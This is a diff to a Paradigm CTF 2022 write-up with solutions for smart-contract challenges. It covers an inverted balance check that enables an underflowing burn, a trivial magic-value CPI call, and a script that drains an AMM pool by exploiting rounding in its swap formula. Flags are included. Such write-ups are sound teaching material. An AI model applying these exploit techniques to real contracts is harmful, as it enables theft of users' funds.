@@ -437,7 +437,7 @@ end
 
 `uint256_le(account_balance, amount)` is wrong. The correct code is `uint256_le(amount, account_balance)`.
 
-Thus, for example, the condition of `checker` is satisfied by executiing the 
+Thus, for example, the condition of `checker` is satisfied by executiing the `burn` function as follows.
 ```py
 await wrapper_contract.functions["burn"].invoke(player_address, (1 << 256) - int(50000e18), max_fee=int(1e16))
 ```
@@ -458,35 +458,125 @@ Flag: `PCTF{d3f4u17_pu811c_5721k35_4941n}`
 
 ### OTTERWORLD
 
+The goal is to satisfy the condition `magic == 0x1337 * 0x7331` of the `get_flag` function in `framework/chall/programs/chall/src/lib.rs`.
 ```rs
-#[program]
-pub mod solve {
-    use super::*;
+pub fn get_flag(_ctx: Context<GetFlag>, magic: u64) -> Result<()> {
+    assert!(magic == 0x1337 * 0x7331);
 
-    pub fn get_flag(ctx: Context<GetFlag>) -> Result<()> {
-
-        let cpi_accounts = chall::cpi::accounts::GetFlag {
-            flag: ctx.accounts.flag.clone(),
-            payer: ctx.accounts.payer.to_account_info(),
-            system_program: ctx.accounts.system_program.to_account_info(),
-            rent: ctx.accounts.rent.to_account_info(),
-        };
-
-        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);
-
-        chall::cpi::get_flag(cpi_ctx, 0x1337 * 0x7331)?;
-
-        Ok(())
-    }
+    Ok(())
 }
+```
+
+The `framework-solve/solve/programs/solve/src/lib.rs` already contains the `get_flag` function call.
+```rs
+chall::cpi::get_flag(cpi_ctx, 0x1337 /* TODO */)?;
+```
+
+Simply change the `get_flag` function call as follows.
+```rs
+chall::cpi::get_flag(cpi_ctx, 0x1337 * 0x7331)?;
+```
+
+**Exploit**
+```
+./setup.sh
+./run.sh
 ```
 
 Flag: `PCTF{0tt3r_w0r1d_8c01j3}`
 
 ### OTTERSWAP
 
+The goal is satisfy the condition `amt_a + amt_b == 3 * AMT - 1` of the `handle_connection` function in `src/ParadigmCTF2022/OtterSwap/_client/framework/src/main.rs`. 
+```rs
+    let in_token_account = chall.read_token_account(user_in_account).await?;
+    let out_token_account = chall.read_token_account(user_out_account).await?;
+
+    let amt_a = in_token_account.amount;
+    let amt_b = out_token_account.amount;
+
+    writeln!(socket, "funds 1: {:?}", amt_a)?;
+    writeln!(socket, "funds 2: {:?}", amt_b)?;
+
+    if amt_a + amt_b == 3 * AMT - 1 {
+        writeln!(socket, "congrats!")?;
+        if let Ok(flag) = env::var("FLAG") {
+            writeln!(socket, "flag: {:?}", flag)?;
+        } else {
+            writeln!(socket, "flag not found, please contact admin")?;
+        }
+    }
 ```
-python compute_optimal_strategy.py
+
+
+The following code of the `swap` function in `src/ParadigmCTF2022/OtterSwap/_client/framework/chall/programs/chall/src/lib.rs` makes it vulnerable to drain tokens from the pool.
+```rs
+        let x = in_pool_account.amount;
+        let y = out_pool_account.amount;
+
+        let out_amount = y - (x * y) / (x + amount);
+```
+
+A function that calculates how best to buy and sell:
+```py
+def f(pool_a_amount, pool_b_amount, player_a_amount, player_b_amount):
+
+    max_total_player_amount = 0
+    optimal_strategy = None
+
+    for first_amount in range(1, player_a_amount + 1):
+        x = pool_a_amount
+        y = pool_b_amount
+        amount = first_amount
+
+        out_amount = y - (x * y) // (x + amount)
+
+        player_a_amount_2 = player_a_amount - amount
+        player_b_amount_2 = player_b_amount + out_amount
+        pool_a_amount_2 = pool_a_amount + amount
+        pool_b_amount_2 = pool_b_amount - out_amount
+
+        for second_amount in range(1, player_b_amount_2 + 1):
+            x = pool_b_amount_2
+            y = pool_a_amount_2
+            amount = second_amount
+
+            out_amount = y - (x * y) // (x + amount)
+
+            player_b_amount_3 = player_b_amount_2 - amount
+            player_a_amount_3 = player_a_amount_2 + out_amount
+            pool_b_amount_3 = pool_b_amount_2 + amount
+            pool_a_amount_3 = pool_a_amount_2 - out_amount
+
+            total_player_amount = player_a_amount_3 + player_b_amount_3
+            if total_player_amount > max_total_player_amount:
+                max_total_player_amount = total_player_amount
+                optimal_strategy = (first_amount, second_amount, pool_a_amount_3, pool_b_amount_3, player_a_amount_3, player_b_amount_3)
+
+    return optimal_strategy
+```
+
+Using this function, compute a sequence of buy and sell strategies:
+```
+$ python compute_optimal_strategy.py
+sell 7 A tokens
+sell 3 B tokens
+player_a_amount, player_b_amount=(10, 2)
+sell 4 A tokens
+sell 3 B tokens
+player_a_amount, player_b_amount=(12, 2)
+sell 3 A tokens
+sell 2 B tokens
+player_a_amount, player_b_amount=(13, 3)
+sell 10 A tokens
+sell 3 B tokens
+player_a_amount, player_b_amount=(14, 5)
+sell 10 A tokens
+sell 2 B tokens
+player_a_amount, player_b_amount=(15, 7)
+sell 11 A tokens
+sell 1 B tokens
+player_a_amount, player_b_amount=(20, 9)
 ```
 
 Flag: `PCTF{l00k_th3_0tt3r_way_z8210}`
